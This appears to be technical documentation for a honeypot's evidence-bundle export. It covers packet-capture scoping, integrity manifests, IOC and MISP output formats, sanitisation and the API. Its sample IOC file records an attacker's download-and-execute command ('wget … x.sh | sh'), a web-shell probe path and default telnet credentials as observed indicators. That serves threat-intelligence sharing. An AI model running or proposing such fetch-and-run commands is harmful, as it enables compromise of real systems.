# RaspberryPot evidence bundle

A single ZIP that pairs the packets with everything needed to interpret and
verify them. Produced from the console's attacker-detail panel (**📦 Evidence
bundle**) or the ⧉/⬇/📦 actions on any session row.

The design goal is *reproducibility*, not description: the bundle carries the
exact Arkime expression, tag and UTC window used to cut the capture, plus a
SHA256 of every file. A recipient can re-run the query on their own Arkime and
prove the file they were sent is the file that was produced.

---

## 1 · Structure

```
rpot-<ip>-<utc>[-sanitised].zip
│
├── capture.pcap        Raw packets from Arkime, filtered to this scope
├── report.pdf          Human-readable analysis (WeasyPrint, A4)
├── iocs.json           Machine-readable indicators
├── iocs.yaml           …the same, in YAML
├── misp-event.json     MISP core-format Event, importable as-is
├── misp-event.yaml     …the same, in YAML
├── SHA256SUMS          coreutils format — `sha256sum -c SHA256SUMS`
└── MANIFEST.txt        Digests, the query used, handling + sanitisation notices
```

Filename example: `rpot-139_135_40_39-20260718T161755Z-sanitised.zip`
The `-sanitised` suffix appears only when sanitisation was applied.

| File | Always present | Notes |
|---|---|---|
| `capture.pcap` | No | Omitted if Arkime returned no packets — a 0-byte capture is misleading in an evidence pack, so it is dropped and the report says so |
| `report.pdf` | Yes | |
| `iocs.json` / `.yaml` | Yes | YAML skipped if PyYAML is missing from the image |
| `misp-event.json` / `.yaml` | Yes | Suppress with `&misp=0` |
| `SHA256SUMS` | Yes | Covers every other file except itself and MANIFEST.txt |
| `MANIFEST.txt` | Yes | |

---

## 2 · Scope

The report never claims more than the capture covers. Scope follows how the
export was launched:

| Scope | Arkime expression | Report contains |
|---|---|---|
| Whole attacker | `ip == <attacker>` | Full profile, all services |
| One service | `ip == <attacker> && port == <service port>` | That service only |
| One session | `ip.src == <attacker> && port.src == <ephemeral>` | That single TCP connection |

Session scope pins the attacker's **ephemeral source port**, not the service
port — otherwise picking one telnet session out of thousands would return every
session sharing port 23. FTP sessions with a separate data channel contribute
both ports, OR'd together.

Scoped exports read the **full event mirror**, not the capped attacker-detail
payload used by the UI panels, so a session's logins and commands are present
even when they are older than the UI's recent-events window.

---

## 3 · MANIFEST.txt

Real output:

```
RaspberryPot evidence bundle
generated : 2026-07-19T08:17:10Z
sanitised : YES — see notice below
source ip : 139.135.40.39
scope     : attacker
sensor    : sensor-1

Arkime query used to cut this capture:
  expression : ip == 139.135.40.39
  tag        : rpot-139_135_40_39-1783625864
  window UTC : 2026-07-17T03:11:55Z -> 2026-07-17T03:13:05Z

SHA256 digests:
  b713dcb534317d821b609460db72434d00f7e4b523cfea76874541baa1ddb61e  capture.pcap  (278 bytes)
  992d900e2e1483d0775d7aebc94745a9c3cb377f86579498da38fc12bfbfe484  report.pdf  (25,113 bytes)
  4424e9c1d75133849ffdc449a9d4bd86c5d74cc8c13fa274904b1f9f4fb702e0  iocs.json  (1,165 bytes)
  1312c746afd79a16f5ffb6d8ae7f2cc8a7898c40b203a451131c64a0ea89598e  iocs.yaml  (913 bytes)
  03c1f5e96118064ca16bb4526b0d251d7e4c95ad4b61e5ecf966b5ea51ee071c  misp-event.json  (6,550 bytes)
  376ec46fb5fb0c9f1f57b33e5728fc22bb9f788cd019a89fde6b2e60e4473ac8  misp-event.yaml  (4,772 bytes)

SANITISATION
------------------------------------------------------------
  SANITISED FOR SHARING. This sensor's own addresses were rewritten to RFC
  5737 / RFC 3849 documentation ranges; MAC addresses were replaced with
  locally-administered values. The attacker's addresses, ports, payloads
  and timings are unmodified. Packet payloads were NOT rewritten — service
  banners, host keys, certificates and hostnames inside the traffic may
  still identify the sensor. Review before sharing externally.

Verify with:  sha256sum -c SHA256SUMS

The capture contains untrusted attacker traffic. Open it in an
isolated analysis environment.
```

Verify:
```sh
unzip rpot-*.zip -d bundle && cd bundle
sha256sum -c SHA256SUMS
```

---

## 4 · report.pdf

Nine numbered sections:

1. **Identity & reputation** — IP, rDNS, geo, ASN, AbuseIPDB score, first/last seen, event counts
2. **JA4+ fingerprints** — JA4H / JA4T / JA4SSH, pulled live from Arkime
3. **Activity summary** — by service, by event type, attack classification
4. **Credentials attempted** — deduplicated with attempt counts and accept/reject
5. **Commands executed** — deduplicated with counts, first-seen timestamp
6. **Files transferred** — SHA256, source, VirusTotal verdict
7. **HTTP requests** — method, path with query string
8. **SQL queries**
9. **Reproducing this capture** — expression, tag, UTC window, PCAP SHA256

Credentials and commands are collapsed to unique values with a count: a
brute-force run is one indicator tried 412 times, not 412 rows.

---

## 5 · iocs.json / iocs.yaml

Flat, boring, and stable — designed to drop into someone else's tooling.

```json
{
  "generated": "2026-07-19T08:19:03Z",
  "source": "RaspberryPot honeypot",
  "scope": "session",
  "observed": { "first": "2026-07-17T03:12:01Z", "last": "2026-07-17T03:12:05Z" },
  "indicators": {
    "ipv4": ["139.135.40.39"],
    "rdns": ["scan-04.example.net"],
    "asn": "AS14061 DigitalOcean",
    "geo": "Netherlands, Amsterdam",
    "ja4": {
      "ja4t":   ["64240_2-1-3-1-1-4_1460_8"],
      "ja4ssh": ["c76s76_c71s59_c0s0"]
    },
    "file_sha256": ["a846c9…"],
    "urls_requested": ["/shell?cmd=id"],
    "credentials_tried": [
      { "service": "telnet", "username": "root", "password": "123456",
        "attempts": 1, "accepted": false },
      { "service": "telnet", "username": "root", "password": "admin",
        "attempts": 1, "accepted": true }
    ],
    "commands_executed": [
      { "command": "wget http://185.220.101.4/x.sh -O- | sh",
        "count": 1, "first_seen": "2026-07-17T03:12:03Z" }
    ]
  },
  "reputation": { "abuseipdb_score": 92 },
  "attack_classes": { "credential_stuffing": 1, "exploit_attempt": 1 },
  "arkime": {
    "expression": "ip.src == 139.135.40.39 && port.src == 51834",
    "tag": "rpot-139_135_40_39-1784000000",
    "start_iso": "2026-07-17T03:11:55Z",
    "stop_iso": "2026-07-17T03:13:05Z",
    "pcap_sha256": "b713dcb5…",
    "pcap_bytes": 18442133
  }
}
```

The YAML twin is the identical structure (`sort_keys=false`, so field order is
preserved rather than alphabetised).

> `arkime.ui_url` is present in unsanitised bundles only. It is dropped when
> sanitising, since it names internal infrastructure and an external recipient
> could not follow it anyway.

---

## 6 · misp-event.json / .yaml

MISP core format. Import via **Event ▸ Import from ▸ MISP JSON**, or:

```python
from pymisp import PyMISP
import json
misp = PyMISP(url, key)
misp.add_event(json.load(open("misp-event.json")))
```

### Event defaults

| Field | Value | Why |
|---|---|---|
| `distribution` | `0` (your org only) | A honeypot bundle carries our own traffic; widening the audience should be deliberate |
| `published` | `false` | Review before it propagates |
| `threat_level_id` | `2` (medium) | |
| `analysis` | `2` (complete) | |
| `Tag` | `tlp:amber`, `type:OSINT`, `misp-galaxy:sector="Honeypot"` (+ `PAP:GREEN` when sanitised) | |

### Attribute mapping

| Source | MISP type | Category | `to_ids` |
|---|---|---|---|
| Attacker address | `ip-src` | Network activity | ✅ |
| Reverse DNS | `hostname` | Network activity | — |
| ASN | `AS` | Network activity | — |
| Payload hash | `sha256` | Payload delivery | ✅ |
| Payload source URL | `url` | Payload delivery | ✅ |
| Requested path | `url` / `uri` | Network activity | — |
| Command executed | `text` | External analysis | — |
| SQL submitted | `text` | External analysis | — |
| Arkime tag | `text` | Internal reference | — |
| PCAP digest | `sha256` | Internal reference | — |

Commands and SQL have `disable_correlation` set — they are narrative, not pivots,
and would otherwise create noisy cross-event correlations.

### Objects

**`credential`** — one per unique username/password pair:
`username`, `password`, `origin` (`honeypot-<service>`), `notification`
(`accepted by honeypot` / `rejected`).

**`ja4-plus`** — one per fingerprint, template UUID
`2c15c75e-e7db-4b62-8d17-633e7571818f`:

```json
{
  "name": "ja4-plus",
  "template_uuid": "2c15c75e-e7db-4b62-8d17-633e7571818f",
  "Attribute": [
    { "object_relation": "ja4-fingerprint", "type": "text",
      "value": "64240_2-1-3-1-1-4_1460_8", "to_ids": true },
    { "object_relation": "ja4-type",   "type": "text",   "value": "JA4T" },
    { "object_relation": "ip-src",     "type": "ip-src", "value": "139.135.40.39" },
    { "object_relation": "description","type": "text",   "value": "Collected by a RaspberryPot…" }
  ]
}
```

`ja4-type` uses the upstream short names: `JA4`, `JA4S`, `JA4H`, `JA4L`, `JA4X`,
`JA4SSH`, `JA4T`, `JA4TS`, `JA4TScan`.

---

## 7 · Sanitisation

**On by default.** The **sanitise** checkbox in attacker detail is ticked unless
you untick it; when you do, the button reads *Evidence bundle (raw)* and a warning
appears beside it. Building a bundle is a sharing action, so the safe state is the
one you get without thinking about it.

Every bundle declares its own status, so you can always check an existing file:

```sh
unzip -p rpot-*.zip MANIFEST.txt | head -3      # -> "sanitised : yes|no"
```

The filename carries it too — a sanitised export ends in `-sanitised.zip`.

> Row-level 📦 buttons on the Sessions and aggressive lists always export **raw**
> — there is no room there to show the option. Use the attacker detail panel for
> anything you intend to share.

### What changes

| Element | Original | Sanitised |
|---|---|---|
| Sensor IPv4 | `10.0.0.21` | `192.0.2.11` (RFC 5737) |
| Sensor IPv6 | `2a01:…` | `2001:db8::11` (RFC 3849) |
| MAC addresses | `de:ad:be:ef:00:01` | `02:00:00:00:00:03` (locally administered) |
| Arkime host in text | `protectli.netwho.lan` | `sensor.internal` |
| `arkime.ui_url` | present | removed |
| Sensor label | `rp-dmz-01` | `sensor-1` |
| Zip / report | — | marked `-sanitised` |

Applied to the PCAP **and** the report/IOC text using the same mapping, so the
documents and the capture never disagree about which host is which. IP and
TCP/UDP checksums are recomputed, so the capture stays valid in Wireshark.

Victim addresses are derived from the capture itself — every packet matches
`ip == <attacker>`, so anything appearing opposite the attacker is ours. There
is no sensor-IP setting to keep in sync.

The attacker MAC is rewritten too: on a routed path that is our own last-hop
router, not the attacker's hardware.

### Never changed

Attacker IP, ports, payload bytes, timings. Those are the evidence.
Public addresses in payloads (e.g. a malware download server) are also
preserved — they are attacker infrastructure worth keeping.

### ⚠ What sanitisation does NOT cover

Only network-layer addresses are rewritten. **Packet payloads are untouched.**
The capture can still contain:

- service banners (SSH version strings, FTP/SMTP greetings)
- TLS certificates and SSH host keys
- SMB hostnames, HTTP `Host:` headers
- any address a service printed into its own output

Rewriting payloads would change lengths and break TCP sequencing, so it is
deliberately not attempted. **Treat sanitisation as removing the obvious
identifiers, not as anonymisation.** Review the capture before it leaves the
building.

---

## 8 · API

```
GET /api/arkime/bundle
```

| Parameter | Required | Meaning |
|---|---|---|
| `worker_id` | ✅ | Sensor holding the attacker profile |
| `ip` | ✅ | Attacker address |
| `port` | — | Service port (service scope) |
| `sports` | — | Comma-separated ephemeral source ports (session scope) |
| `start`, `stop` | — | Epoch seconds; padded ±5 s for clock skew |
| `session_id` | — | Narrow the report to one session |
| `service` | — | Narrow the report to one service |
| `tag` | — | Arkime tag to cite in the manifest |
| `sanitize` | — | `1` to sanitise |
| `misp` | — | `0` to omit the MISP files |

Returns `application/zip`. Errors are JSON with a `detail` field; a failed
sanitisation returns **500 and no bundle** rather than shipping an unsanitised
one.

If the capture could not be fetched the bundle is still returned — the telemetry
is still worth having — but never silently: the reason appears in the
`X-Rpot-Pcap-Status` response header, in the console status line, in a
`!! NO CAPTURE IN THIS BUNDLE !!` block in `MANIFEST.txt`, and as a red banner in
section 9 of the report.

### Arkime endpoint note

The PCAP export route requires a trailing filename segment:

```
GET /api/sessions/pcap/<anyfilename>.pcap?expression=…&startTime=…&stopTime=…
```

The bare `/api/sessions/pcap` returns **404**. Arkime uses the filename only for
the download name; content comes entirely from the expression and window.

---

## 9 · Handling

The capture contains live attacker traffic — shell payloads, malware URLs,
exploit attempts. Open it in an isolated analysis environment. Both the report
and the manifest carry this notice, and the report additionally states that every
address, credential and command in it originated from the remote party: none of
it reflects a real service or a real account.
